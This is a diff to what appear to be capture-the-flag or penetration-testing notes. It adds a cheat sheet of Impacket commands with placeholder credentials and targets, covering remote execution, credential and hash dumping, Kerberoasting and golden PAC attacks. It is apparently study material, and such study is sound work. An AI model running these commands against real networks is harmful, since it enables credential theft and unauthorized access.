@@ -19,5 +19,22 @@ enum4linux -a example.com
 -Do an nmblookup (Similar to nbtstat)
 -Get printer infromation
 
+addcomputer.py domain/username:password
+atexec.py domain/username:password@example.com <Command>
+dcomexec.py domain/username:password@example.com <Command> if not > spawn semi-interactive shell
+findDelegation.py domain/username:password
+GetADUsers.py domain/username:password
+getArch.py -target example.com/IP-adres
+GetNPUsers.py domain/username:password
+getPac.py domain/username:password
+getST.py domain/username:password
+getTGT.py domain/username:password
+GetUserSPNs.py -dc-ip 10.10.10.X hackthebox.htb/username
+goldenPac.py domain/username:password@example.com
+lookupsid.py domain/username:password@example.com
+netview.py domain/useranem:password
+psexec.py domain/username:password@example.com <Command>
+samrdump.py domain/username:password@example.com
+secretsdump.py domain/username:password@example.com
 lookupsid.py (Impacket)
 psexec.py (Impacket)
